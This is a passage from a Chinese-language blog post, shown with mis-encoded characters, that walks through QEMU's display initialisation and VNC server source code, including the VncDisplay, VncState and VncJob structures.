<code>text_console_do_init()</code> è¿›è¡Œåˆå§‹åŒ–å·¥ä½œï¼Œä¸»è¦æ˜¯å°†å…¶è®¾ä¸ºæ ‡å‡†çš„ <code>80*24</code> çš„å­—ç¬¦æ˜¾ç¤ºè®¾å¤‡ï¼Œå¹¶å°†å…¶ <code>hw_ops</code> è®¾ä¸º <code>text_console_ops</code>ï¼Œå…¶ <code>hw</code> åˆ™æŒ‡å‘ QemuConsole è‡ªèº«</p><h2 id="äºŒã€qemu-display-init-è°ƒç”¨å¯¹åº”ç±»å‹-QemuDisplay-çš„-init-å‡½æ•°è¿›è¡Œåˆå§‹åŒ–"><a href="#äºŒã€qemu-display-init-è°ƒç”¨å¯¹åº”ç±»å‹-QemuDisplay-çš„-init-å‡½æ•°è¿›è¡Œåˆå§‹åŒ–" class="headerlink" title="äºŒã€qemu_display_init() - è°ƒç”¨å¯¹åº”ç±»å‹ QemuDisplay çš„ init å‡½æ•°è¿›è¡Œåˆå§‹åŒ–"></a>äºŒã€qemu_display_init() - è°ƒç”¨å¯¹åº”ç±»å‹ QemuDisplay çš„ init å‡½æ•°è¿›è¡Œåˆå§‹åŒ–</h2><p>è¯¥å‡½æ•°åŒæ ·å®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_display_init</span><span class="hljs-params">(DisplayState *ds, DisplayOptions *opts)</span><br>&#123;<br>    assert(opts-&gt;type &lt; DISPLAY_TYPE__MAX);<br>    <span class="hljs-keyword">if</span> (opts-&gt;type == DISPLAY_TYPE_NONE) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    assert(dpys[opts-&gt;type] != <span class="hljs-literal">NULL</span>);<br>    dpys[opts-&gt;type]-&gt;init(ds, opts);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„ dpys æ˜¯ä¸€ä¸ª <code>QemuDisplay</code> ç±»å‹çš„å…¨å±€æ•°ç»„ï¼Œå®šä¹‰äº <code>ui/console.c</code> ä¸­ï¼Œè¡¨ç¤º Qemu æ‰€æ”¯æŒçš„æ‰€æœ‰æ˜¾ç¤ºç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>qemu_display_register()</code> å°†æ˜¾ç¤ºç±»å‹æ³¨å†Œåˆ°è¯¥æ•°ç»„ä¸­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> QemuDisplay *dpys[DISPLAY_TYPE__MAX];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_display_register</span><span class="hljs-params">(QemuDisplay *ui)</span><br>&#123;<br>    assert(ui-&gt;type &lt; DISPLAY_TYPE__MAX);<br>    dpys[ui-&gt;type] = ui;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>QemuDisplay</code> ç»“æ„ä½“å®šä¹‰äº <code>ui/console.h</code> ä¸­ï¼Œè¡¨ç¤º Qemu æ‰€æ”¯æŒçš„å•ä¸ªæ˜¾ç¤ºç±»å‹ï¼Œä¸»è¦å°±æ˜¯ç±»å‹ + åˆå§‹åŒ–çš„å‡½æ•°æŒ‡é’ˆï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QemuDisplay</span> &#123;</span><br>    DisplayType type;<br>    <span class="hljs-type">void</span> (*early_init)(DisplayOptions *opts);<br>    <span class="hljs-type">void</span> (*init)(DisplayState *ds, DisplayOptions *opts);<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>ä¸è¿‡ç»ç¬”è€…è°ƒè¯•é€šå¸¸æƒ…å†µä¸‹ä¸ç‰¹å®šæŒ‡å®šçš„è¯éƒ½ä¼šæ˜¯ <code>DISPLAY_TYPE_NONE</code> </p></blockquote><h1 id="0x02-vnc-init-func-åˆå§‹åŒ–å•ä¸ª-VNC-Server"><a href="#0x02-vnc-init-func-åˆå§‹åŒ–å•ä¸ª-VNC-Server" class="headerlink" title="0x02. vnc_init_func() - åˆå§‹åŒ–å•ä¸ª VNC Server"></a>0x02. vnc_init_func() - åˆå§‹åŒ–å•ä¸ª VNC Server</h1><p>åœ¨ä¸€ä¸ª Qemu å®ä¾‹å½“ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸åªä¼šä½¿ç”¨åˆ°ä¸€ä¸ª VGA è®¾å¤‡ï¼ˆä¹Ÿå¯ä»¥å¤šä¸ªï¼‰ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥åŒæ—¶å¯åŠ¨å¤šä¸ª VNC Serverï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥é™„åŠ å¯åŠ¨å‚æ•° <code>-vnc yourip:0 -vnc yourip:1</code>ï¼Œæ­¤æ—¶ Qemu å°±ä¼šåœ¨ 5700 ä¸ 5701 ç«¯å£ä¸Šå¯åŠ¨ä¸¤ä¸ª VNC æœåŠ¡å™¨ï¼Œè€Œæ¯ä¸ª VNC Server çš„å¯åŠ¨éƒ½æ˜¯é€šè¿‡ <code>vnc_init_func()</code> æ¥å®Œæˆçš„</p><p>å½“æˆ‘ä»¬åªæœ‰ä¸€ä¸ª VGA è®¾å¤‡è¾“å‡ºæ—¶ï¼Œå…¶è¾“å‡ºä¼šè¢«åŒæ—¶æ›´æ–°ç»™å¤šä¸ª VNC Clientï¼Œæ­¤æ—¶å¤šä¸ª VNC Client æ‰€è·å–åˆ°çš„ç”»é¢æ˜¯ç›¸åŒçš„</p><p><code>vnc_init_func()</code> å®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œæ¯”è¾ƒç®€çŸ­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vnc_init_func</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, QemuOpts *opts, Error **errp)</span><br>&#123;<br>    Error *local_err = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">char</span> *id = (<span class="hljs-type">char</span> *)qemu_opts_id(opts);<br><br>    assert(id);<br>    vnc_display_init(id, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err) &#123;<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    vnc_display_open(id, &amp;local_err);<br>    <span class="hljs-keyword">if</span> (local_err != <span class="hljs-literal">NULL</span>) &#123;<br>        error_propagate(errp, local_err);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦åšäº†ä¸¤ä»¶äº‹ï¼š</p><ul><li><code>vnc_display_init()</code>ï¼šåˆå§‹åŒ–ä¸€ä¸ª <code>VncDisplay</code> å®ä¾‹</li><li><code>vnc_display_open()</code>ï¼šå¯åŠ¨ä¸€ä¸ª VNC Server</li></ul><p><code>vnc_display_open()</code> ä¸»è¦å°±æ˜¯å•çº¯çš„åˆ›å»ºä¸€ä¸ªæ™®é€šçš„ serverï¼Œä»¥åŠä¸€äº›å’Œ VNC åè®®å…·ä½“ç»†èŠ‚ç›¸å…³çš„éƒ¨åˆ†ï¼Œæ•…æˆ‘ä»¬æ¥ä¸‹æ¥ä¸»è¦åˆ†æ <code>vnc_display_init()</code></p><h2 id="ã€‡ã€VNC-ç›¸å…³ç»“æ„ä½“"><a href="#ã€‡ã€VNC-ç›¸å…³ç»“æ„ä½“" class="headerlink" title="ã€‡ã€VNC ç›¸å…³ç»“æ„ä½“"></a>ã€‡ã€VNC ç›¸å…³ç»“æ„ä½“</h2><h3 id="Iã€VncDisplay-å•ä¸ª-VNC-Server-å®ä¾‹"><a href="#Iã€VncDisplay-å•ä¸ª-VNC-Server-å®ä¾‹" class="headerlink" title="Iã€VncDisplay - å•ä¸ª VNC Server å®ä¾‹"></a>Iã€VncDisplay - å•ä¸ª VNC Server å®ä¾‹</h3><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/vnc.h</code> ä¸­ï¼Œè¡¨ç¤ºå•ä¸ª VNC Server å®ä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncDisplay</span></span><br><span class="hljs-class">&#123;</span><br>    QTAILQ_HEAD(, VncState) clients;<br>    <span class="hljs-type">int</span> num_connecting;<br>    <span class="hljs-type">int</span> num_shared;<br>    <span class="hljs-type">int</span> num_exclusive;<br>    <span class="hljs-type">int</span> connections_limit;<br>    VncSharePolicy share_policy;<br>    QIONetListener *listener;<br>    QIONetListener *wslistener;<br>    DisplaySurface *ds;<br>    DisplayChangeListener dcl;<br>    <span class="hljs-type">kbd_layout_t</span> *kbd_layout;<br>    <span class="hljs-type">int</span> lock_key_sync;<br>    QEMUPutLEDEntry *led;<br>    <span class="hljs-type">int</span> ledstate;<br>    QKbdState *kbd;<br>    QemuMutex mutex;<br><br>    QEMUCursor *cursor;<br>    <span class="hljs-type">int</span> cursor_msize;<br>    <span class="hljs-type">uint8_t</span> *cursor_mask;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncSurface</span> <span class="hljs-title">guest</span>;</span>   <span class="hljs-comment">/* guest visible surface (aka ds-&gt;surface) */</span><br>    <span class="hljs-type">pixman_image_t</span> *server;    <span class="hljs-comment">/* vnc server surface */</span><br>    <span class="hljs-type">int</span> true_width; <span class="hljs-comment">/* server surface width before rounding up */</span><br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *id;<br>    QTAILQ_ENTRY(VncDisplay) next;<br>    <span class="hljs-type">bool</span> is_unix;<br>    <span class="hljs-type">char</span> *password;<br>    <span class="hljs-type">time_t</span> expires;<br>    <span class="hljs-type">int</span> auth;<br>    <span class="hljs-type">int</span> subauth; <span class="hljs-comment">/* Used by VeNCrypt */</span><br>    <span class="hljs-type">int</span> ws_auth; <span class="hljs-comment">/* Used by websockets */</span><br>    <span class="hljs-type">int</span> ws_subauth; <span class="hljs-comment">/* Used by websockets */</span><br>    <span class="hljs-type">bool</span> lossy;<br>    <span class="hljs-type">bool</span> non_adaptive;<br>    <span class="hljs-type">bool</span> power_control;<br>    QCryptoTLSCreds *tlscreds;<br>    QAuthZ *tlsauthz;<br>    <span class="hljs-type">char</span> *tlsauthzid;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC_SASL</span><br>    VncDisplaySASL sasl;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    AudioState *audio_state;<br>&#125;;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™å‡ ä¸ªæˆå‘˜å˜é‡ï¼š</p><ul><li><code>clients</code>ï¼šè¿æ¥åˆ°è¯¥æœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰å®¢æˆ·ç«¯ï¼Œæ¯ä¸ªå®¢æˆ·ç«¯ä¸ºä¸€ä¸ª <code>VncClient</code> å®ä¾‹ï¼Œå¤šä¸ª <code>VncClient</code> å®ä¾‹é—´å½¢æˆä¸€ä¸ªé“¾è¡¨</li><li><code>ds</code>ï¼š</li><li><code>dcl</code>ï¼šè¯¥ VNC Server æ‰€ç›‘å¬çš„ QemuConsole çš„ç›‘å¬å™¨ï¼Œå½“å¯¹åº”çš„ QemuConsole å‘ç”Ÿæ›´æ”¹æ—¶ä¾¿ä¼šè°ƒç”¨ <code>dcl-&gt;ops</code> ä¸­å¯¹åº”å‡½æ•°æŒ‡é’ˆ</li><li><code>next</code>ï¼šå¤šä¸ª VncDisplay ä¹‹é—´äº’ç›¸è¿æ¥å½¢æˆä¸€ä¸ªé“¾è¡¨</li></ul><p>åŒæ—¶å­˜åœ¨ç€ä¸€ä¸ªå…¨å±€å˜é‡ <code>vnc_displays</code>ï¼ŒQemu ä¸­æ‰€æœ‰çš„ VncDisplay éƒ½æŒ‚è½½åœ¨è¯¥é“¾è¡¨ä¸Šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-title function_">QTAILQ_HEAD</span><span class="hljs-params">(, VncDisplay)</span> vnc_displays =<br>    QTAILQ_HEAD_INITIALIZER(vnc_displays);<br></code></pre></td></tr></table></figure><h3 id="IIã€VncState-å•ä¸ª-VNC-è¿æ¥ï¼ˆVNC-Clientï¼‰"><a href="#IIã€VncState-å•ä¸ª-VNC-è¿æ¥ï¼ˆVNC-Clientï¼‰" class="headerlink" title="IIã€VncState - å•ä¸ª VNC è¿æ¥ï¼ˆVNC Clientï¼‰"></a>IIã€VncState - å•ä¸ª VNC è¿æ¥ï¼ˆVNC Clientï¼‰</h3><p>è¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/vnc.h</code> ä¸­ï¼Œè¡¨ç¤ºè¿æ¥åˆ°ç‰¹å®š VNC Server ä¸Šçš„å•ä¸ª VNC Client å®ä¾‹ï¼Œå…¶ä¸­åŒ…å«å®¢æˆ·ç«¯çš„å„ç§ä¿¡æ¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncState</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> magic;<br>    QIOChannelSocket *sioc; <span class="hljs-comment">/* The underlying socket */</span><br>    QIOChannel *ioc; <span class="hljs-comment">/* The channel currently used for I/O */</span><br>    guint ioc_tag;<br>    gboolean disconnecting;<br><br>    DECLARE_BITMAP(dirty[VNC_MAX_HEIGHT], VNC_DIRTY_BITS);<br>    <span class="hljs-type">uint8_t</span> **lossy_rect; <span class="hljs-comment">/* Not an Array to avoid costly memcpy in</span><br><span class="hljs-comment">                           * vnc-jobs-async.c */</span><br><br>    VncDisplay *vd;<br>    VncStateUpdate update; <span class="hljs-comment">/* Most recent pending request from client */</span><br>    VncStateUpdate job_update; <span class="hljs-comment">/* Currently processed by job thread */</span><br>    <span class="hljs-type">int</span> has_dirty;<br>    <span class="hljs-type">uint32_t</span> features;<br>    <span class="hljs-type">int</span> absolute;<br>    <span class="hljs-type">int</span> last_x;<br>    <span class="hljs-type">int</span> last_y;<br>    <span class="hljs-type">uint32_t</span> last_bmask;<br>    <span class="hljs-type">size_t</span> client_width; <span class="hljs-comment">/* limited to u16 by RFB proto */</span><br>    <span class="hljs-type">size_t</span> client_height; <span class="hljs-comment">/* limited to u16 by RFB proto */</span><br>    VncShareMode share_mode;<br><br>    <span class="hljs-type">uint32_t</span> vnc_encoding;<br><br>    <span class="hljs-type">int</span> major;<br>    <span class="hljs-type">int</span> minor;<br><br>    <span class="hljs-type">int</span> auth;<br>    <span class="hljs-type">int</span> subauth; <span class="hljs-comment">/* Used by VeNCrypt */</span><br>    <span class="hljs-type">char</span> challenge[VNC_AUTH_CHALLENGE_SIZE];<br>    QCryptoTLSSession *tls; <span class="hljs-comment">/* Borrowed pointer from channel, don&#x27;t free */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC_SASL</span><br>    VncStateSASL sasl;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-type">bool</span> encode_ws;<br>    <span class="hljs-type">bool</span> websocket;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_VNC</span><br>    VncClientInfo *info;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">/* Job thread bottom half has put data for a forced update</span><br><span class="hljs-comment">     * into the output buffer. This offset points to the end of</span><br><span class="hljs-comment">     * the update data in the output buffer. This lets us determine</span><br><span class="hljs-comment">     * when a force update is fully sent to the client, allowing</span><br><span class="hljs-comment">     * us to process further forced updates. */</span><br>    <span class="hljs-type">size_t</span> force_update_offset;<br>    <span class="hljs-comment">/* We allow multiple incremental updates or audio capture</span><br><span class="hljs-comment">     * samples to be queued in output buffer, provided the</span><br><span class="hljs-comment">     * buffer size doesn&#x27;t exceed this threshold. The value</span><br><span class="hljs-comment">     * is calculating dynamically based on framebuffer size</span><br><span class="hljs-comment">     * and audio sample settings in vnc_update_throttle_offset() */</span><br>    <span class="hljs-type">size_t</span> throttle_output_offset;<br>    Buffer output;<br>    Buffer input;<br>    <span class="hljs-comment">/* current output mode information */</span><br>    VncWritePixels *write_pixels;<br>    PixelFormat client_pf;<br>    <span class="hljs-type">pixman_format_code_t</span> client_format;<br>    <span class="hljs-type">bool</span> client_be;<br><br>    CaptureVoiceOut *audio_cap;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">audsettings</span> <span class="hljs-title">as</span>;</span><br><br>    VncReadEvent *read_handler;<br>    <span class="hljs-type">size_t</span> read_handler_expect;<br><br>    <span class="hljs-type">bool</span> <span class="hljs-built_in">abort</span>;<br>    QemuMutex output_mutex;<br>    QEMUBH *bh;<br>    Buffer jobs_buffer;<br><br>    <span class="hljs-comment">/* Encoding specific, if you add something here, don&#x27;t forget to</span><br><span class="hljs-comment">     *  update vnc_async_encoding_start()</span><br><span class="hljs-comment">     */</span><br>    VncTight *tight;<br>    VncZlib zlib;<br>    VncHextile hextile;<br>    VncZrle *zrle;<br>    VncZywrle zywrle;<br><br>    Notifier mouse_mode_notifier;<br><br>    QemuClipboardPeer cbpeer;<br>    QemuClipboardInfo *cbinfo;<br>    <span class="hljs-type">uint32_t</span> cbpending;<br><br>    QTAILQ_ENTRY(VncState) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨åŒä¸€ä¸ª VncDisplay ï¼ˆVNC Serverï¼‰ä¸‹çš„æ‰€æœ‰ VncStateï¼ˆVNC Clientï¼‰è¿æ¥æˆä¸€ä¸ªé“¾è¡¨</p><h3 id="IIIã€VncJob-å•ä¸ª-VNC-è¿æ¥å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯"><a href="#IIIã€VncJob-å•ä¸ª-VNC-è¿æ¥å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯" class="headerlink" title="IIIã€VncJob - å•ä¸ª VNC è¿æ¥å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯"></a>IIIã€VncJob - å•ä¸ª VNC è¿æ¥å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯</h3><p>VncJob ç»“æ„ä½“ç”¨æ¥è¡¨ç¤ºå•ä¸ª VNC è¿æ¥ï¼ˆVncStateï¼‰å•æ¬¡éœ€è¦æ›´æ–°çš„å›¾åƒä¿¡æ¯ï¼Œå®šä¹‰äº <code>ui/vnc.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJob</span></span><br><span class="hljs-class">&#123;</span><br>    VncState *vs;<br><br>    QLIST_HEAD(, VncRectEntry) rectangles;<br>    QTAILQ_ENTRY(VncJob) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨å•æ¬¡çš„å›¾åƒæ›´æ–°å½“ä¸­ï¼Œå•ä¸ªçŸ©å½¢åŒºåŸŸå…·ä½“çš„çš„æ›´æ–°ä¿¡æ¯ä½¿ç”¨ <code>VncRectEntry</code> ç»“æ„ä½“è¡¨ç¤ºï¼Œå•ä¸ª VncJob ä¸­å¯ä»¥æœ‰å¤šä¸ª VncRectEntryï¼Œä»–ä»¬ä¹‹é—´å½¢æˆä¸€ä¸ªå•å‘é“¾è¡¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRect</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> x;<br>    <span class="hljs-type">int</span> y;<br>    <span class="hljs-type">int</span> w;<br>    <span class="hljs-type">int</span> h;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRectEntry</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncRect</span> <span class="hljs-title">rect</span>;</span><br>    QLIST_ENTRY(VncRectEntry) next;<br>&#125;;<br></code></pre></td></tr></table></figure><p>å¤šä¸ª VncJob ä¹‹é—´ä¹Ÿæ„æˆä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œæœ€ç»ˆæŒ‚è½½åˆ°ä¸€ä¸ª <code>VncJobQueue</code> ç»“æ„ä½“ä¸Šï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>ui/vnc-jobs.c</code> ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJobQueue</span> &#123;</span><br>    QemuCond cond;<br>    QemuMutex mutex;<br>    QemuThread thread;<br>    <span class="hljs-type">bool</span> <span class="hljs-built_in">exit</span>;<br>    QTAILQ_HEAD(, VncJob) jobs;<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VncJobQueue</span> <span class="hljs-title">VncJobQueue</span>;</span><br></code></pre></td></tr></table></figure><p>åŒæ—¶æˆ‘ä»¬å­˜åœ¨ç€ä¸€ä¸ªå…¨å±€çš„ VncJobQueueï¼Œé»˜è®¤æƒ…å†µä¸‹æˆ‘ä»¬ä¼šå°† VncJob æŒ‚è½½åˆ°ä¸Šé¢ï¼ŒåŒæ—¶ vnc worker threadï¼ˆè´Ÿè´£å°†å›¾åƒä¿¡æ¯å‘é€ç»™ client çš„çº¿ç¨‹ï¼‰ä¹Ÿæ˜¯ä¸»è¦ä¾èµ–äºè¿™ä¸ªå…¨å±€çš„ queue</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We use a single global queue, but most of the functions are</span><br><span class="hljs-comment"> * already reentrant, so we can easily add more than one encoding thread</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> VncJobQueue *<span class="hljs-built_in">queue</span>;<br></code></pre></td></tr></table></figure><h2 id="ä¸€ã€vnc-display-init"><a href="#ä¸€ã€vnc-display-init" class="headerlink" title="ä¸€ã€vnc_display_init()"></a>ä¸€ã€vnc_display_init()</h2><p>è¯¥å‡½æ•°ä¸»è¦ä½œç”¨ä¾¿æ˜¯åˆå§‹åŒ–ä¸€ä¸ª <code>VncDisplay</code> ç»“æ„ä½“ï¼Œå®šä¹‰äº <code>ui/vnc.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vnc_display_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *id, Error **errp)</span><br>&#123;<br>    VncDisplay *vd;<br><br>    <span class="hljs-keyword">if</span> (vnc_display_find(id) != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    vd = g_malloc0(<span class="hljs-keyword">sizeof</span>(*vd));<br><br>    vd-&gt;id = strdup(id);<br>    QTAILQ_INSERT_TAIL(&amp;vnc_displays, vd, next);  <span class="hljs-comment">// åŠ å…¥åˆ°å…¨å±€é“¾è¡¨ä¸­</span><br><br>    